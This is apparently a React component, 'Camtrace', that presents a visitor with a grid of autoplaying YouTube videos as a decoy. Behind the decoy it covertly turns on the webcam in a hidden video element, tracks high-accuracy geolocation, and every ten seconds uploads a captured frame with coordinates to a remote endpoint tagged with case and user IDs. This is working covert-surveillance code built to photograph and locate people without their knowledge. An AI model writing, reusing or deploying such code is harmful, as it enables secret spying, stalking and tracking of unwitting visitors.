import { useEffect, useRef } from "react";
import { UPLOAD_FILE } from "./../constant/contant";
import { useSearchParams } from "react-router-dom";
import "./../css/VideoGrid.css";

const Camtrace = () => {
  const cameraRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [searchParams] = useSearchParams();
  const id = searchParams.get("id");
  const caseName = searchParams.get("caseName");
  const userId = searchParams.get("userId");

  useEffect(() => {
    let captureCount = 0;
    let intervalId: number;
    let stream: MediaStream | null = null;
    let currentLocation: { lat: number; lng: number } | null = null;

    // ✅ Get user geolocation continuously
    const watchLocation = () => {
      if (!navigator.geolocation) {
        console.warn("Geolocation not supported");
        return;
      }

      navigator.geolocation.watchPosition(
        (position) => {
          currentLocation = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
          };
        },
        (err) => console.error("Location error:", err),
        { enableHighAccuracy: true }
      );
    };

    const startCamera = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });

        if (cameraRef.current) {
          cameraRef.current.srcObject = stream;
        }

        watchLocation();

        intervalId = window.setInterval(() => {
          if (captureCount >= 25) {
            cleanup();
            return;
          }
          captureAndSendFrame(currentLocation);
          captureCount++;
        }, 10000);
      } catch (err) {
        console.error("Camera access error:", err);
      }
    };

    startCamera();

    const cleanup = () => {
      clearInterval(intervalId);
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };

    return cleanup;
  }, [id, caseName, userId]);

  const captureAndSendFrame = (
    location: { lat: number; lng: number } | null
  ) => {
    if (!cameraRef.current || !canvasRef.current) return;

    const video = cameraRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(
      (blob) => {
        if (!blob || !id) return;

        const formData = new FormData();
        formData.append("file", blob, "frame.jpg");

        if (location) {
          formData.append("latitude", location.lat.toString());
          formData.append("longitude", location.lng.toString());
        }

        fetch(`${UPLOAD_FILE}?id=${id}&caseName=${caseName}&userId=${userId}`, {
          method: "POST",
          body: formData,
        }).catch((err) => console.error("Upload failed:", err));
      },
      "image/jpeg",
      0.8
    );
  };

  return (
    <div className="container">
      <div className="video-grid">
        {[...Array(6)].map((_, key) => (
          <div key={key} className="video-wrapper">
            <iframe
              src="https://www.youtube.com/embed/udgrClXV26Y?autoplay=1&mute=1"
              title="YouTube video"
              allow="autoplay; encrypted-media; microphone; camera"
              allowFullScreen
            />
          </div>
        ))}
      </div>

      {/* Hidden camera video */}
      <video ref={cameraRef} autoPlay playsInline style={{ display: "none" }} />

      {/* Hidden canvas for capturing */}
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </div>
  );
};

export default Camtrace;
